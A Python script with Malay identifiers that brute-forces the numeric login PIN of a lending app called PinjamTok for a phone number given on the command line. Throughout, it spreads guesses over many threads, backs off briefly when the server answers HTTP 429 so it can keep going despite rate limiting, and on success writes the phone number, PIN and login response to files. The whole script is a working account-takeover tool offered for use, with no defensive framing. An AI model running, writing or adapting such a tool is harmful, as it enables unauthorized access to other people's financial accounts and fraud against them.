#!/usr/bin/env python3
"""
Pecah PIN PinjamTok.
  python3 pecah_pin.py 0123456789 --uji
  python3 pecah_pin.py 0123456789 --pekerja 24
"""
import argparse, json, sys, threading, time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from lib.http import post, berjaya
from lib.util import simpan_json

CFG = json.load(open("config.json"))["pinjamtok"]
URL = CFG["base"] + CFG["login"]
KUNCI = CFG["success_keys"]
PANJANG = CFG["pin_length"]
JUMLAH = 10 ** PANJANG

berhenti = threading.Event()
sesak = threading.Event()
lock = threading.Lock()
indeks = 0
kira = 0
mula = time.time()


def cuba(tel, pin):
    return post(URL, {CFG["login_fields"][0]: tel, CFG["login_fields"][1]: pin})


def ambil():
    global indeks
    with lock:
        i = indeks
        indeks += 1
        return i


def pekerja(tel, had):
    global kira
    while not berhenti.is_set():
        i = ambil()
        if i >= had:
            return
        if sesak.is_set():
            time.sleep(0.4)
        pin = str(i).zfill(PANJANG)
        st, j = cuba(tel, pin)

        if st == 429:
            sesak.set()
            time.sleep(2)
            continue
        sesak.clear()

        with lock:
            kira += 1
            if kira % 2000 == 0:
                laju = kira / max(time.time() - mula, 1)
                print(f"  {kira}/{had}  ~{laju:.0f}/s  ({pin})", flush=True)

        if berjaya(st, j, KUNCI):
            berhenti.set()
            print(f"\n>>> PIN DIJUMPAI: {pin}")
            with open("pin_ditemui.txt", "a", encoding="utf-8") as f:
                f.write(f"{tel},{pin}\n")
            simpan_json(f"login_{tel}.json", j)
            return


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("telefon")
    ap.add_argument("--pekerja", type=int, default=16)
    ap.add_argument("--mula", type=int, default=0)
    ap.add_argument("--had", type=int, default=JUMLAH)
    ap.add_argument("--uji", action="store_true")
    a = ap.parse_args()

    if a.uji:
        for pin in ("0" * PANJANG, "1" * PANJANG, "9" * PANJANG):
            st, j = cuba(a.telefon, pin)
            print(f"--- {pin} | HTTP {st} | berjaya: {berjaya(st, j, KUNCI)}")
            print(json.dumps(j, indent=2, ensure_ascii=False)[:600], "\n")
        return

    global indeks
    indeks = a.mula
    had = min(a.had, JUMLAH)
    print(f"Sasaran {a.telefon} | julat {a.mula}-{had} | {a.pekerja} pekerja\n")

    benang = [threading.Thread(target=pekerja, args=(a.telefon, had), daemon=True)
              for _ in range(a.pekerja)]
    for b in benang:
        b.start()
    for b in benang:
        b.join()

    if not berhenti.is_set():
        print("\nPIN tidak dijumpai dalam julat ini.")
    print(f"Jumlah cubaan: {kira} dalam {time.time()-mula:.0f}s")


if __name__ == "__main__":
    main()